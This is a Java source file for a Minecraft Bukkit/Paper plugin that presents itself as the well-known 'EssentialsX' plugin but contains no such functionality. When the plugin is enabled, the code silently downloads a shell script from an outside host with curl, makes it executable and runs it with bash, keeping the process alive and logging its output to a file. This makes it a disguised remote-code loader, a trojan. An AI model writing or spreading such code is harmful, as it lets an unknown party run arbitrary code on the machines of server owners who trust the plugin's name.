package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.nio.file.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {

    private Process process;
    private volatile boolean isProcessRunning = false;

    private Path logFile;

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        try {
            logFile = getDataFolder().toPath().resolve("test.txt");

            // 确保目录存在
            Files.createDirectories(getDataFolder().toPath());

            startRemoteScript();

            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start remote script: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void startRemoteScript() throws Exception {
        if (isProcessRunning) return;

        String url = "https://netjett-de.kof95zip.pp.ua/paper/start.sh";

        Path scriptPath = getDataFolder()
                .toPath()
                .resolve("start.sh");

        String path = scriptPath.toString();


        // 检查文件
        if (!Files.exists(scriptPath)) {

            getLogger().info("start.sh not found, downloading...");

            String downloadCmd =
                    "curl -Ls " + url + " -o \"" + path + "\"";

            int exit = runCommand(downloadCmd, "DOWNLOAD");

            if (exit != 0) {
                throw new RuntimeException(
                        "Download failed: " + exit
                );
            }

            } else {

                getLogger().info(
                        "start.sh exists, skip download."
                );
            }


            // 添加执行权限
            runCommand(
                "chmod +x \"" + path + "\"",
                "CHMOD"
            );


            // 执行
            ProcessBuilder pb =
                    new ProcessBuilder(
                            "bash",
                        path
                    );

            process = pb.start();

            isProcessRunning = true;

            startLogRedirect();
            startProcessMonitor();
            }

    /**
     * 执行单次命令并写日志
     */
    private int runCommand(String cmd, String tag) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", cmd);
        Process p = pb.start();

        try (
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                BufferedReader errReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
                BufferedWriter writer = Files.newBufferedWriter(logFile,
                        StandardOpenOption.CREATE,
                        StandardOpenOption.APPEND)
        ) {
            String line;

            while ((line = reader.readLine()) != null) {
                writer.write("[" + tag + "] " + line);
                writer.newLine();
            }

            while ((line = errReader.readLine()) != null) {
                writer.write("[" + tag + "][ERR] " + line);
                writer.newLine();
            }
        }

        return p.waitFor();
    }

    /**
     * 实时输出脚本执行日志
     */
    private void startLogRedirect() {
        Thread logThread = new Thread(() -> {
            try (
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(process.getInputStream()));
                    BufferedReader errReader = new BufferedReader(
                            new InputStreamReader(process.getErrorStream()));
                    BufferedWriter writer = Files.newBufferedWriter(logFile,
                            StandardOpenOption.CREATE,
                            StandardOpenOption.APPEND)
            ) {
                String line;

                while ((line = reader.readLine()) != null) {
                    writer.write("[RUN] " + line);
                    writer.newLine();
                    writer.flush();
                }

                while ((line = errReader.readLine()) != null) {
                    writer.write("[RUN][ERR] " + line);
                    writer.newLine();
                    writer.flush();
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }, "Script-Log-Thread");

        logThread.setDaemon(true);
        logThread.start();
    }

    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = process.waitFor();
                isProcessRunning = false;

                try (BufferedWriter writer = Files.newBufferedWriter(logFile,
                        StandardOpenOption.CREATE,
                        StandardOpenOption.APPEND)) {

                    writer.write("[SYSTEM] Process exited with code: " + exitCode);
                    writer.newLine();
                }

                getLogger().info("Remote script exited with code: " + exitCode);

            } catch (Exception e) {
                isProcessRunning = false;
                Thread.currentThread().interrupt();
            }
        }, "Remote-Script-Monitor");

        monitorThread.setDaemon(true);
        monitorThread.start();
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");

        if (process != null && process.isAlive()) {
            process.destroy();

            try {
                if (!process.waitFor(10, TimeUnit.SECONDS)) {
                    process.destroyForcibly();
                }
            } catch (InterruptedException e) {
                process.destroyForcibly();
                Thread.currentThread().interrupt();
            }

            isProcessRunning = false;
        }

        getLogger().info("EssentialsX plugin disabled");
    }
}
